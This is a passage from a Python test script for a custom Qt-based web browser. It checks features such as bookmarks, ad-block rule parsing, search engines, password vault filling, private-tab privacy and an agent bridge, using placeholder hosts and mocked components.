        _took106 = br._chord_key(_ev106)
    except AttributeError:
        _took106 = False
finally:
    br.run_action = _real_ra106
    if hasattr(br, "_chord_end"):
        br._chord_end()
    else:
        br._chord_waiting = False
    if _ks106 == "__absent__":
        br.config.pop("keySequences", None)
    else:
        br.config["keySequences"] = _ks106
check("the letter after the leader key runs its command",
      _took106 and _ran106 == ["bookmark"], str((_took106, _ran106)))
_tr106 = {}
_real_ct106 = br.caption_tools
br.caption_tools = lambda: {"captionTranslator": "/bin/echo"}
try:
    try:
        br.run_translator("x" * 500, then=lambda out: _tr106.update(v=out),
                          limit=0)
        H.wait_for(lambda: "v" in _tr106, 5000)
    except TypeError:
        pass
finally:
    br.caption_tools = _real_ct106
check("a translated paragraph comes back whole, not its last 220 chars",
      len(_tr106.get("v", "")) > 500, str(len(_tr106.get("v", ""))))


class _CertErr106:
    def url(self):
        return B.QUrl("https://private106.example/")

    def description(self):
        return "bad"

    def isOverridable(self):
        return True

    def certificateChain(self):
        return []


_ce106 = json.dumps(br.certificate_exceptions())
_q106 = B.QMessageBox.question
B.QMessageBox.question = staticmethod(
    lambda *a, **k: B.QMessageBox.StandardButton.Yes)
_cf106 = br.certificate_for
br.certificate_for = lambda *a, **k: {"sha256": "ab" * 32}
try:
    try:
        _ok106 = br.certificate_error(_CertErr106(), private=True)
    except TypeError:
        _ok106 = False
finally:
    B.QMessageBox.question = _q106
    br.certificate_for = _cf106
check("a certificate trusted in a private tab is not written to the config",
      _ok106 and json.dumps(br.certificate_exceptions()) == _ce106,
      str((_ok106, "private106.example" in br.certificate_exceptions())))

# ===== fifth pass, part 2: agent bridge, vault, downloads, bookmarks =====
import agent_bridge as _AB107
_ab107 = _AB107.AgentBridge(br)
_out107 = []
_ab107._reply = lambda conn, payload: _out107.append(payload)
_fp107 = br.new_tab(url=srv.url("/twhome?up=1"), switch=False)
H.wait_for(lambda: "/twhome" in _fp107.url().toString(), 8000)
_pg107 = _fp107.page()
_pg107._agent_files = ["/etc/hostname"]
_pg107._agent_files_for = ("other107.example", B.time.monotonic())
try:
    _got107 = _pg107._agent_files_take()
    _pg107._agent_files = ["/etc/hostname"]
    _pg107._agent_files_for = (_fp107.url().host(), B.time.monotonic())
    _mine107 = _pg107._agent_files_take()
except AttributeError:
    _got107, _mine107 = ["/etc/hostname"], None
check("files armed for one site are not handed to another site's chooser",
      _got107 is None and _mine107 == ["/etc/hostname"],
      str((_got107, _mine107)))
br.close_tab(br.tabs.indexOf(_fp107), ask=False)
_bm_n107 = len(br.bookmarks)
_pb107 = br.new_tab(url=srv.url("/twhome?privbm=1"), switch=True,
                    private=True)
H.wait_for(lambda: "/twhome" in _pb107.url().toString(), 8000)
_ab107.op_bookmarks(None, {"action": "add"})
_bm_after107 = len(br.bookmarks)
br.close_tab(br.tabs.indexOf(_pb107), ask=False)
check("the bridge never bookmarks a private tab", _bm_after107 == _bm_n107,
      str((_bm_n107, _bm_after107, _out107[-1:])))
_audit107 = json.dumps(br.config.get("bridgeAudit") or [])
_lv107 = br.config.get("bridgeLevel", "__absent__")
br.config["bridgeLevel"] = "off"
_ab107._dispatch(None, json.dumps({
    "op": "open", "url": "https://secret107.example/?token=abc",
    "private": True}).encode())
_rows107 = json.dumps(br.config.get("bridgeAudit") or [])
if _lv107 == "__absent__":
    br.config.pop("bridgeLevel", None)
else:
    br.config["bridgeLevel"] = _lv107
br.config["bridgeAudit"] = json.loads(_audit107)
check("the audit log never writes a private open's address",
      "secret107" not in _rows107, _rows107[-160:])
_macros107 = json.dumps(br.config.get("macros") or {})
br.config["macros"] = {"login107": [{"op": "click", "selector": "#a"}]}
_ab107.macro = {"tab": None, "steps": [], "private": False}
_ab107._macro_rows = lambda: []
_ab107._find = lambda tab: _mv107
_mv107 = br.new_tab(url=srv.url("/twhome?mac=1"), switch=False)
H.wait_for(lambda: "/twhome" in _mv107.url().toString(), 8000)
del _out107[:]
_ab107.op_macro(None, {"do": "stop", "name": "login107"})
H.wait_for(lambda: bool(_out107), 5000)
_kept107 = (br.config.get("macros") or {}).get("login107")
br.config["macros"] = json.loads(_macros107)
br.close_tab(br.tabs.indexOf(_mv107), ask=False)
check("stopping a macro after the page moved on keeps the saved one",
      _kept107 == [{"op": "click", "selector": "#a"}], str(_kept107))
_vl107 = []
_real_lv107 = br.lock_vault
br.lock_vault = lambda: _vl107.append(1) or True
try:
    if br.vault_lock.enabled():
        br.lock_vault_now()
        _lock_ok107 = _vl107 == [1]
    else:
        _lock_ok107 = True
finally:
    br.lock_vault = _real_lv107
check("'Lock now' runs the whole lock", _lock_ok107, str(_vl107))
br._pw_attempts = {1: {"at": B.time.monotonic() - 60, "data": {}},
                   2: {"at": B.time.monotonic(), "data": {}}}
try:
    br._prune_attempts()
    _left107 = sorted(br._pw_attempts)
except AttributeError:
    _left107 = [1, 2]
br._pw_attempts = {}
check("a held sign-in attempt older than 30 s is let go", _left107 == [2],
      str(_left107))
_dls107 = list(br.downloads)
_keep107 = br.config.get("dlKeepDays", "__absent__")
br.config["dlKeepDays"] = 7
br.downloads[:] = [{"name": "old107", "state": "done",
                    "t": B.time.time() - 30 * 86400},
                   {"name": "new107", "state": "done", "t": B.time.time()}]
br._dl_cleaned_at = 0
br._schedule_tick()
_names107 = [d.get("name") for d in br.downloads]
br.downloads[:] = _dls107
br.save_downloads()
if _keep107 == "__absent__":
    br.config.pop("dlKeepDays", None)
else:
    br.config["dlKeepDays"] = _keep107
check("finished downloads older than the keep-days leave the list",
      _names107 == ["new107"], str(_names107))
_bms107 = list(br.bookmarks)
_undo107 = (getattr(br, "_bookmark_undo", None),
            getattr(br, "_bookmark_undo_at", None))
_top107 = br.add_bookmark_folder("Top107", 0)
_in107 = br.add_bookmark_folder("Locked107", _top107)
_link107 = (br._add_link("https://locked107.example/", "L", parent=_in107)
            or {}).get("id")
br.lock_folder(_in107, True)
br.remove_bookmark(_top107)
_still107 = br._bookmark_by_id(_in107) is not None
br.update_bookmark(_link107, "renamed107", "https://locked107.example/")
_title107 = (br._bookmark_by_id(_link107) or {}).get("title")
br.bookmarks = _bms107
br.save_bookmarks()
br._bookmark_undo, br._bookmark_undo_at = _undo107
check("a locked folder survives deleting its parent, and its links keep "
      "their names", _still107 and _title107 == "L",
      str((_still107, _title107)))
_dsr107 = br.config.get("darkSiteRules", "__absent__")
br.config["darkSiteRules"] = ["leftalone107.example"]
_th107 = B.theme_web.themes_host(br, "leftalone107.example") \
    if B.theme_web.enabled(br) else False
if _dsr107 == "__absent__":
    br.config.pop("darkSiteRules", None)
else:
    br.config["darkSiteRules"] = _dsr107
check("'Sites to leave alone' are not themed", not _th107, str(_th107))
_wv107 = br.new_tab(url=srv.url("/twhome?watch=1"), switch=False)
H.wait_for(lambda: "/twhome" in _wv107.url().toString(), 8000)
_ab107._find = lambda tab: _wv107
_ab107.watches[107] = {"tab": 1, "selector": "body", "was": None,
                       "changes": 0, "timer": None}
_lv107 = br.config.get("bridgeLevel", "__absent__")
br.config["bridgeLevel"] = "off"
_ab107._watch_tick(107)
_alive107 = 107 in _ab107.watches
_ab107.watches.pop(107, None)
if _lv107 == "__absent__":
    br.config.pop("bridgeLevel", None)
else:
    br.config["bridgeLevel"] = _lv107
br.close_tab(br.tabs.indexOf(_wv107), ask=False)
check("a watch stops once the bridge is switched off", not _alive107,
      str(_alive107))

# ===== sixth pass, part 1: ad lists, engines, print, snooze, keys ========
import adblock as _AD108
_k108, _v108 = _AD108.parse_line("||popads108.example^$popup")
check("a $popup rule is not kept as a rule for every request",
      _k108 == "skip", str((_k108, _v108)))
_rs108 = _AD108.Rules()
# "/banner108/" alone is a regular expression in filter-list syntax (and
# skipped as one): a path rule is written with something after it
_rs108.load_text("/banner108/*\n||ad*.example108.com^\n/ads108/banner.\n")
_doc108 = _rs108.blocks("https://news.example/banner108/story", "",
                        "document")
_img108 = _rs108.blocks("https://news.example/banner108/x.png",
                        "news.example", "image")
_wild108 = _rs108.blocks("https://ad7.example108.com/x.js", "site.example",
                         "script")
_case108 = _rs108.blocks("https://x.example/Ads108/Banner.PNG",
                         "x.example", "image")
check("a rule without $document leaves the page itself alone",
      _doc108 is None and _img108 is not None, str((_doc108, _img108)))
check("a host rule with a wildcard in the host still matches",
      _wild108 is not None, str(_wild108))
check("list rules match whatever the case of the address",
      _case108 is not None, str(_case108))
class _Sig108:
    def connect(self, fn):
        pass


class _Reply108:
    finished = _Sig108()

    def abort(self):
        pass


_os108 = br.new_tab(url=srv.url("/twhome?os=1"), switch=True)
H.wait_for(lambda: "/twhome" in _os108.url().toString(), 8000)
_os108._opensearch = {"name": "Evil", "href": "https://evil108.example/os.xml",
                      "host": "evil108.example"}
_fl108 = []
_real_fl108 = br.flash
br.flash = lambda text, *a, **k: _fl108.append(text)
_nam_got108 = []
br._nam.get = lambda req: _nam_got108.append(req.url().toString()) \
    or _Reply108()
try:
    _off108 = br.offer_opensearch(view=_os108)
finally:
    br.flash = _real_fl108
    br._nam.__dict__.pop("get", None)
br.close_tab(br.tabs.indexOf(_os108), ask=False)
check("another page's search offer is not saved under this site",
      _off108 is False and not _nam_got108, str((_off108, _nam_got108)))
_et108 = br.config.get("enginesText", "__absent__")
_oe108 = json.dumps(br.config.get("ownEngines") or [])
_sk108 = json.dumps(br.config.get("searchKeywords") or {})
_ek108 = br.config.get("engineKeywords", "__absent__")
br.parse_engines("Rev108|https://r108.example/?q=%s|r108")
br.parse_engines("Rev108|https://r108.example/?q=%s|s108")
_kw108 = dict(br.config.get("searchKeywords") or {})
br.add_engine("Added108", "https://a108.example/?q={searchTerms}", "a108")
_txt108 = str(br.config.get("enginesText") or "")
for _k, _v in (("enginesText", _et108), ("engineKeywords", _ek108)):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.config["ownEngines"] = json.loads(_oe108)
br.config["searchKeywords"] = json.loads(_sk108)
check("a changed engine keyword stops the old one searching",
      "s108" in _kw108 and "r108" not in _kw108, str(sorted(_kw108)[:8]))
check("an engine added from a page stays in the engines text",
      "Added108|" in _txt108, _txt108[-80:])
_se108 = br.config.get("searchEngine", "__absent__")
_ss108 = br.config.get("searchSuggestions", "__absent__")
br.config["searchEngine"] = "duckduckgo"
br.config["searchSuggestions"] = True
_sv108 = br.new_tab(url=srv.url("/twhome?sug=1"), switch=True); H.spin(300)
br._suggest_reply = None
br.urlbar.setText("cats and dogs 108")
br.urlbar.hasFocus = lambda: True


_asked108 = []
_real_nam108 = br._nam.get
br._nam.get = lambda req: _asked108.append(req.url().host()) or _Reply108()
try:
    br._fetch_suggestions()
    _sent108 = bool(_asked108)
except Exception as _e:
    _sent108 = "err " + repr(_e)
finally:
    br.urlbar.__dict__.pop("hasFocus", None)
    br._nam.__dict__.pop("get", None)
    br._suggest_reply = None
for _k, _v in (("searchEngine", _se108), ("searchSuggestions", _ss108)):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.urlbar.setText("")
br.close_tab(br.tabs.indexOf(_sv108), ask=False)
check("with DuckDuckGo chosen nothing typed goes to Google's suggestions",
      _sent108 is False, str(_sent108))
_sz108 = json.dumps(br.config.get("snoozed") or [])
br.config["snoozed"] = [{"url": srv.url("/twhome?snz=1"),
                         "at": B.time.time() - 5},
                        {"url": srv.url("/twhome?snz=2"),
                         "at": B.time.time() + 9999}]
_before108 = br.tabs.count()
br._desk_tick(); H.spin(300)
_woke108 = br.tabs.count() - _before108
try:
    _all108 = br.wake_snoozed(everything=True)
except TypeError:
    _all108 = 0
H.spin(300)
for _i in reversed(range(br.tabs.count())):
    _w = br.tabs.widget(_i)
    if _w is not None and not br._is_header(_w) \
            and "snz=" in (getattr(_w, "_requested", "") or
                           _w.url().toString()):
        br.close_tab(_i, ask=False)
br.config["snoozed"] = json.loads(_sz108)
check("a snoozed tab wakes while the browser runs, and the menu wakes all",
      _woke108 == 1 and _all108 == 1, str((_woke108, _all108)))
_la108 = getattr(br, "_last_action", None)
br._last_action = "keyrepeat"
_rep108 = br.repeat_last_action()
br._last_action = _la108
check("'repeat last action' never repeats itself", _rep108 == "",
      str(_rep108))
_mb108 = br.config.get("mouseButtons", "__absent__")
_eb108 = br.config.get("extraButtons", "__absent__")
br.config["mouseButtons"] = False
br.set_button_action("XButton3", "reload")
_tab108 = br.button_actions()
_mb_after108 = br.config.get("mouseButtons")
for _k, _v in (("mouseButtons", _mb108), ("extraButtons", _eb108)):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("the side-button switch and the button table do not overwrite each other",
      _tab108.get("XButton3") == "reload" and _mb_after108 is False,
      str((_tab108, _mb_after108)))
_pt108 = []
_real_pt108 = br.play_tool
br.play_tool = lambda name, view=None, then=None, arg=None: (
    _pt108.append((name, view, arg)) or True)
_gp108 = br.config.get("gamepadOn", "__absent__")
_ga108 = br.new_tab(url=srv.url("/twhome?pad=1"), switch=False); H.spin(200)
try:
    br.gamepad(on=False)
finally:
    br.play_tool = _real_pt108
    if _gp108 == "__absent__":
        br.config.pop("gamepadOn", None)
    else:
        br.config["gamepadOn"] = _gp108
br.close_tab(br.tabs.indexOf(_ga108), ask=False)
check("the gamepad switch reaches every tab, not only the one in front",
      any(v is _ga108 and a is False for n, v, a in _pt108), str(len(_pt108)))
_dup108 = [s for s in br.findChildren(B.QShortcut)
           if s.key().toString() == B.QKeySequence("Ctrl++").toString()]
check("Ctrl++ is bound once, not twice (Qt fires neither)",
      len(_dup108) <= 1, str(len(_dup108)))

# ===== sixth pass, part 2: notes, translator, spelling, nav, tabs, keys ==
_pn109 = [B.notes.parse_note(t) for t in (
    "---\nmy text", "---\ntitle: x\nsome text\n---\nmore",
    "---\ntitle: T\ndate: 2026\n---\nbody")]
check("a note that only starts with --- keeps all its text",
      _pn109[0]["body"] == "---\nmy text"
      and _pn109[1]["body"].startswith("---\ntitle: x\nsome text"),
      str([p["body"][:20] for p in _pn109]))
check("a note's own front-matter keys are written back on save",
      "date: 2026" in B.notes.note_text(_pn109[2]),
      B.notes.note_text(_pn109[2])[:60])
_tr109 = {}
_real_ct109 = br.caption_tools
br.caption_tools = lambda: {"captionTranslator": "~/no-such-translator-109"}
try:
    br.run_translator("hello", then=lambda out: _tr109.update(v=out))
    H.wait_for(lambda: "v" in _tr109, 5000)
finally:
    br.caption_tools = _real_ct109
check("a translator that cannot start answers instead of stalling",
      _tr109.get("v") == "", str(_tr109))
_sl109 = (br.config.get("spellLangs", "__absent__"),
          br.config.get("spellBoth", "__absent__"))
_real_sd109, _real_as109 = br.spell_dictionaries, br.apply_spellcheck
br.spell_dictionaries = lambda: ["de-DE", "en-US"]
br.apply_spellcheck = lambda *a, **k: None
try:
    br.spell_both_languages(True)
    _on109 = list(br.config.get("spellLangs") or [])
    br.spell_both_languages(False)
    _off109 = list(br.config.get("spellLangs") or [])
finally:
    br.spell_dictionaries, br.apply_spellcheck = _real_sd109, _real_as109
for _k, _v in zip(("spellLangs", "spellBoth"), _sl109):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("spelling in two languages finds Qt's de-DE/en-US and switches off",
      _on109 == ["de-DE", "en-US"] and _off109 == [], str((_on109, _off109)))
_nv109 = br.new_tab(url=srv.url("/twhome?nav=1"), switch=False)
H.wait_for(lambda: "/twhome" in _nv109.url().toString(), 8000)
_off_was109 = br.config.get("offline", False)
br.config["offline"] = True
_pg109 = _nv109.page()
_pg109._main_nav_url = B.QUrl(srv.url("/twhome?nav=1"))
try:
    _pg109.acceptNavigationRequest(
        B.QUrl("http://refused109.example/"),
        B.QWebEnginePage.NavigationType.NavigationTypeLinkClicked, True)
finally:
    br.config["offline"] = _off_was109
_mn109 = _pg109._main_nav_url.toString()
check("a refused navigation does not vouch for that host's login box",
      "refused109" not in _mn109, _mn109)
_mt109 = []
# the click comes from the tab in front (a script's location.href is a
# "link click" too, so a background tab may not open compose tabs)
br.tabs.setCurrentWidget(_nv109); H.spin(100)
br._page_acted = {}
_real_mu109, _real_om109 = br.mailto_url, br.open_mailto
br.mailto_url = lambda m: "https://mail.example/compose"
br.open_mailto = lambda m, v=None: _mt109.append(m)
try:
    _pg109.acceptNavigationRequest(
        B.QUrl("mailto:a@b.example"),
        B.QWebEnginePage.NavigationType.NavigationTypeRedirect, True)
    _script109 = len(_mt109)
    _pg109.acceptNavigationRequest(
        B.QUrl("mailto:a@b.example"),
        B.QWebEnginePage.NavigationType.NavigationTypeLinkClicked, True)
    _click109 = len(_mt109) - _script109
finally:
    br.mailto_url, br.open_mailto = _real_mu109, _real_om109
br.close_tab(br.tabs.indexOf(_nv109), ask=False)
check("a mailto from a redirect opens no compose tab; a click does",
      _script109 == 0 and _click109 == 1, str((_script109, _click109)))
_ga109 = br.new_tab(url=srv.url("/twhome?anc=1"), switch=False); H.spin(200)
_gb109 = br.new_tab(url=srv.url("/twhome?anc=2"), switch=False); H.spin(200)
br.toggle_tab_selection(br.tabs.indexOf(_ga109))
br.close_tab(br.tabs.indexOf(_ga109), ask=False)
H.spin(300)
_err109 = ""
try:
    br.select_tab_range(br.tabs.indexOf(_gb109))
except RuntimeError as _e:
    _err109 = repr(_e)
br.clear_tab_selection()
check("shift-click after the anchor tab was closed does not raise",
      not _err109, _err109)
_pin109 = br.new_tab(url=srv.url("/twhome?pin109=1"), switch=False)
H.spin(200)
br._register_group("G109", "#cba6f7")
br._move_tab_to_group(br.tabs.indexOf(_gb109), "G109")
_gc109 = br.new_tab(url=srv.url("/twhome?anc=3"), switch=False,
                    group="G109"); H.spin(200)
br.pin_tab(br.tabs.indexOf(_pin109), True)
br._drag_view = _pin109
br.tabs.tabBar().moveTab(br.tabs.indexOf(_pin109), br.tabs.indexOf(_gc109))
H.spin(100)
_pg_g109 = getattr(_pin109, "group", None)
br._drag_view = None
br.pin_tab(br.tabs.indexOf(_pin109), False)
for _w in (_pin109, _gb109, _gc109):
    _close_if_open(_w)
H.spin(200)
check("a pinned tab dragged into a group stays out of it",
      _pg_g109 is None, str(_pg_g109))


class _Rail109:
    browser = br
    folded = False


_fp_a109 = B.TabSidebar.fingerprint(_Rail109())
_gcol109 = dict(br.group_colors)
br.group_colors["Rail109"] = "#123456"
_fp_b109 = B.TabSidebar.fingerprint(_Rail109())
br.group_colors.clear()
br.group_colors.update(_gcol109)
check("the tab rail notices a group colour change", _fp_a109 != _fp_b109)
_re109 = br._plugin_pattern_to_regex("<all_urls>")
check("@match <all_urls> matches a web page",
      bool(B.re.match(_re109, "https://x109.example/a")), _re109)
_said109 = []


class _Desk109:
    rows = []

    def due_todos(self):
        return list(self.rows)


_d109 = _Desk109()
_real_desk109, _real_fl109 = br.desk, br.flash
_real_nd109 = br.notify_desktop
br.desk = lambda: _d109
br.flash = lambda text, *a, **k: _said109.append(text)
br.notify_desktop = lambda *a, **k: None
_ts109 = getattr(br, "_todo_said", {})
br._todo_said = {}
try:
    _d109.rows = [{"id": 5, "text": "first109", "due": 1, "done": False}]
    br._desk_tick()
    _d109.rows = [{"id": 5, "text": "second109", "due": 2, "done": False}]
    br._desk_tick()
    br._desk_tick()
finally:
    br.desk, br.flash, br.notify_desktop = (_real_desk109, _real_fl109,
                                             _real_nd109)
    br._todo_said = _ts109
_todo_lines109 = [t for t in _said109 if "109" in t]
check("a to-do reminder is not swallowed by another one's line number",
      len(_todo_lines109) == 2 and "second109" in _todo_lines109[-1],
      str(_todo_lines109))
_sc109 = br.config.get("shortcuts", "__absent__")
try:
    br.bridge.setSetting("shortcuts", json.dumps({"newtab": "Ctrl+Alt+F9"}))
    _keys109 = [s.key().toString() for s in br.findChildren(B.QShortcut)
                if s.isEnabled()]
finally:
    if _sc109 == "__absent__":
        br.config.pop("shortcuts", None)
    else:
        br.config["shortcuts"] = _sc109
    try:
        br.rebind_shortcuts()
    except AttributeError:
        pass
check("a key changed in Settings works without a restart",
      B.QKeySequence("Ctrl+Alt+F9").toString() in _keys109,
      str(len(_keys109)))

# ===== fifth pass, part 3: 1Password secrets come from a worker ==========
class _Prov110:
    eager = False
    name = "1password"


class _Vault110:
    provider = _Prov110()
    asked = []

    def reveal(self, item_id, field):
        self.asked.append((item_id, field))
        return "pw110"


_real_vault110 = br.vault
_got110 = {}
br.vault = _Vault110()
try:
    try:
        br._with_password({"id": "op110", "username": "u", "password": ""},
                          lambda pw: _got110.update(v=pw))
        H.wait_for(lambda: "v" in _got110, 8000)
    except AttributeError:
        pass
finally:
    br.vault = _real_vault110
check("a 1Password login's password is fetched for the fill, not left empty",
      _got110.get("v") == "pw110", str(_got110))

# ===== fifth/sixth pass lows: macros, downloads, notes, ads, keys, styles ==
import agent_bridge as _AB111
_ab111 = _AB111.AgentBridge(br)
_out111 = []
_ab111._reply = lambda conn, payload: _out111.append(payload)
_ab111.op_macro(None, {"do": "play", "steps": [{"op": "click",
                                                "selector": "#a"}, "oops"]})
check("a macro with a malformed step is refused with a reply",
      _out111 and _out111[-1].get("error") == "bad-steps", str(_out111[-1:]))
_dd111 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_dd111 / "same111.txt").write_text("newer download")
_dls111 = list(br.downloads)
br.downloads[:] = [
    {"id": "old111", "name": "same111.txt", "dir": str(_dd111),
     "state": "cancelled", "t": 1},
    {"id": "new111", "name": "same111.txt", "dir": str(_dd111),
     "state": "done", "t": 2}]
br.forget_download("old111", from_disk=True, ask=False)
_kept111 = (_dd111 / "same111.txt").exists()
br.downloads[:] = _dls111
br.save_downloads()
check("deleting an old row's file leaves a newer download's file alone",
      _kept111, str(_kept111))
if br.desk() is not None:
    br.desk()._clips = ["clip111"]
    br.set_notes_folder(br.config.get("notesFolder") or "")
    _clips111 = list(getattr(br.desk(), "_clips", []))
    check("saving the notes folder unchanged keeps the clipboard history",
          _clips111 == ["clip111"], str(_clips111))
    br.desk()._clips = []
import adblock as _AD111
_rs111 = _AD111.Rules()
_rs111.load_text("##.generic111\nsite111.example##.own111\n")
_hide111 = _rs111.hide_for("site111.example")
check("a site's own hiding rules come first, before the generic ones",
      _hide111[:1] == [".own111"], str(_hide111))
_sc111 = br.config.get("shortcuts", "__absent__")
br.config["shortcuts"] = {"zoomin": "Ctrl+Alt+F8"}
try:
    br.rebind_shortcuts()
    _zk111 = [s.key().toString() for s in br.findChildren(B.QShortcut)
              if s.isEnabled()]
except AttributeError:
    _zk111 = [B.QKeySequence("Ctrl++").toString()]
finally:
    if _sc111 == "__absent__":
        br.config.pop("shortcuts", None)
    else:
        br.config["shortcuts"] = _sc111
    try:
        br.rebind_shortcuts()
    except AttributeError:
        pass
check("a rebound zoom key no longer leaves Ctrl++ zooming",
      B.QKeySequence("Ctrl+Alt+F8").toString() in _zk111
      and _zk111.count(B.QKeySequence("Ctrl+Shift++").toString()) == 0,
      str(len(_zk111)))
_ran111 = []
_cov111 = getattr(br, "_lock_cover", None)
br._lock_cover = object()
try:
    try:
        br._palette_run({"id": "history", "run": lambda: _ran111.append(1),
                         "pane": False})
    except AttributeError:
        _ran111.append("old")
finally:
    br._lock_cover = _cov111
check("an action picked in the palette does not run behind the lock",
      _ran111 == [], str(_ran111))
_ss111 = json.dumps(br.config.get("siteStyles") or {})
br.config["siteStyles"] = {"example111.com": "a{}",
                           "blog.example111.com": "b{}"}
_sv111 = br.new_tab(url=srv.url("/twhome?style=1"), switch=False)
H.wait_for(lambda: "/twhome" in _sv111.url().toString(), 8000)
_js111 = []
_sv111.page().runJavaScript = lambda code, *a: _js111.append(code)
try:
    br.apply_site_style(_sv111, url=B.QUrl("https://blog.example111.com/x"))
finally:
    _sv111.page().__dict__.pop("runJavaScript", None)
br.config["siteStyles"] = json.loads(_ss111)
br.close_tab(br.tabs.indexOf(_sv111), ask=False)
check("the most specific site stylesheet is the one applied",
      _js111 and '"b{}"' in _js111[-1], str(_js111[-1:])[:80])

# ===== lows, part 2: list separators, sites, engines, bookmarks, 1Password ==
import adblock as _AD112
_rs112 = _AD112.Rules()
_rs112.load_text("||cdn112.example/ad^\n||static112.example.com^$third-party\n")
check("'^' in a list rule is a separator, not a prefix",
      _rs112.blocks("https://cdn112.example/ads-good/app.js", "x.example",
                    "script") is None
      and _rs112.blocks("https://cdn112.example/ad/x.js", "x.example",
                        "script") is not None)
check("a sibling subdomain is the same site, not a third party",
      _rs112.blocks("https://static112.example.com/x.js",
                    "m.example.com",
                    "script") is None)
_ost112 = json.dumps(br.opensearch_table() or {})
_own112 = json.dumps(br.config.get("ownEngines") or [])
_et112 = br.config.get("enginesText", "__absent__")
br.note_opensearch("dup112.example", "Dup",
                   "https://dup112.example/s?q={searchTerms}&l={language?}")
br.add_engine("Dup", "https://dup112.example/s?q={searchTerms}",
              engine_id="dup112.example")
_rows112 = [r for r in br.all_engines() if r["id"] == "dup112.example"]
_tpl112 = (br.opensearch_table().get("dup112.example") or {}).get("url", "")
br.config["openSearch"] = json.loads(_ost112)
br.config["ownEngines"] = json.loads(_own112)
if _et112 == "__absent__":
    br.config.pop("enginesText", None)
else:
    br.config["enginesText"] = _et112
check("a site's own engine is listed once, with no stray {param}",
      len(_rows112) == 1 and "{language" not in _tpl112,
      str((len(_rows112), _tpl112)))
_bms112 = list(br.bookmarks)
_f112 = br.add_bookmark_folder("Lock112", 0)
_l112 = (br._add_link("https://l112.example/", "L112", parent=0)
         or {}).get("id")
br.lock_folder(_f112, True)
_sig112 = []
br.bridge.bookmarksChanged.connect(lambda: _sig112.append(1))
br.move_bookmark(_l112, _f112, 0)
H.spin(100)
_moved112 = (br._bookmark_by_id(_l112) or {}).get("parent")
br.bookmarks = _bms112
br.save_bookmarks()
check("a move into a locked folder is refused and the page is told",
      _moved112 == 0 and len(_sig112) >= 1, str((_moved112, _sig112)))


class _Prov112:
    eager = False


class _Vault112:
    provider = _Prov112()

    def is_never(self, host):
        return False

    def get(self, host, username):
        return {"id": "op112", "username": username, "password": ""}

    def reveal(self, item_id, field):
        return "same112"

    def touch(self, host, username):
        _touched112.append(username)


_touched112, _asked112 = [], []
_real_v112, _real_pp112 = br.vault, br._password_prompt
_real_lk112 = br.vault_locked
_real_vpo112 = br.vault_password_on
_sp_was112 = br.config.get("savePasswords", "__absent__")
br.vault = _Vault112()
br.vault_locked = lambda: False
# saving switched on for this check: an earlier section can leave either
# switch off, and then nothing is compared at all
br.vault_password_on = lambda: True
br.config["savePasswords"] = True
br._password_prompt = lambda *a, **k: _asked112.append(a)
_pv112 = br.new_tab(url=srv.url("/twhome?op=1"), switch=False)
H.wait_for(lambda: "/twhome" in _pv112.url().toString(), 8000)
try:
    br._password_submitted(_pv112.page(), {
        "host": _pv112.url().host(), "username": "u112",
        "password": "same112"})
    H.wait_for(lambda: _touched112 or _asked112, 5000)
finally:
    br.vault, br._password_prompt = _real_v112, _real_pp112
    br.vault_locked = _real_lk112
    br.vault_password_on = _real_vpo112
    for _n112 in ("vault_password_on", "vault_locked", "_password_prompt"):
        br.__dict__.pop(_n112, None)
    if _sp_was112 == "__absent__":
        br.config.pop("savePasswords", None)
    else:
        br.config["savePasswords"] = _sp_was112
br.close_tab(br.tabs.indexOf(_pv112), ask=False)
check("signing in with the saved 1Password password asks nothing",
      _touched112 == ["u112"] and not _asked112,
      str((_touched112, _asked112)))
_mic112 = (_Path(B.__file__).parent / "mictest.html").read_text()
check("Record waits for the microphone and never runs two recorders",
      "await micStarting" in _mic112 and "const mine = recorder" in _mic112)

# ===== lows, part 3: history bookmarks, Clear all, CSV import twice =======
_bm_n113 = len(br.bookmarks)
_made113 = br.bridge.bookmarkHistoryUrls(json.dumps(["file:///etc/x",
                                                     "javascript:1"]))
check("bookmarking only non-web history rows makes no empty folder",
      _made113 == 0 and len(br.bookmarks) == _bm_n113,
      str((_made113, len(br.bookmarks) - _bm_n113)))
_hist113 = list(br.history)
br.history.append({"url": "https://hist113.example/", "title": "Hist 113",
                   "t": B.time.time()})
_bms113 = list(br.bookmarks)
br.bridge.bookmarkHistoryUrls(json.dumps(["https://hist113.example/"]))
_t113 = [e.get("title") for e in br.bookmarks
         if e.get("url") == "https://hist113.example/"]
br.bookmarks = _bms113
br.save_bookmarks()
check("a history row bookmarked keeps its page title",
      _t113 == ["Hist 113"], str(_t113))
_n113 = br.bridge.clearHistory()
br.history[:] = _hist113
br.save_history()
check("Clear all reports how many entries it cleared",
      isinstance(_n113, int) and _n113 == len(_hist113) + 1, str(_n113))
_vd113 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_pv113 = B.PasswordVault(_vd113)
_csv113 = "name,url,username,password\nEx,https://ex113.example,u,p1\n"
_pv113.import_rows(_csv113)
_pv113.import_rows(_csv113)
_rows113 = [i for i in _pv113.items() if "ex113" in str(i.get("host"))]
check("the same CSV imported twice leaves one login, not two",
      len(_rows113) == 1, str(len(_rows113)))

# ===== lows, part 4: allowed popups, text zoom in divs ====================
_pp114 = br.new_tab(url=srv.url("/twhome?pop=1"), switch=False)
H.wait_for(lambda: "/twhome" in _pp114.url().toString(), 8000)
_rules114 = json.dumps(br.config.get("popupSites") or [])
_real_pa114 = br.popups_allowed_for
br.popups_allowed_for = lambda url: True
try:
    _pp114.page().acceptNavigationRequest(
        B.QUrl(srv.url("/twhome?pop=2")),
        B.QWebEnginePage.NavigationType.NavigationTypeLinkClicked, True)
    _can114 = _pp114.page().settings().testAttribute(
        B.QWebEngineSettings.WebAttribute.JavascriptCanOpenWindows)
finally:
    br.popups_allowed_for = _real_pa114
br.close_tab(br.tabs.indexOf(_pp114), ask=False)
check("a site on the popup allow list may open windows",
      _can114 is True, str(_can114))
_a11y114 = B.A11Y_JS
check("text zoom also reaches text straight in a div or a th",
      "BLOCKS" in _a11y114 and " th," in _a11y114)

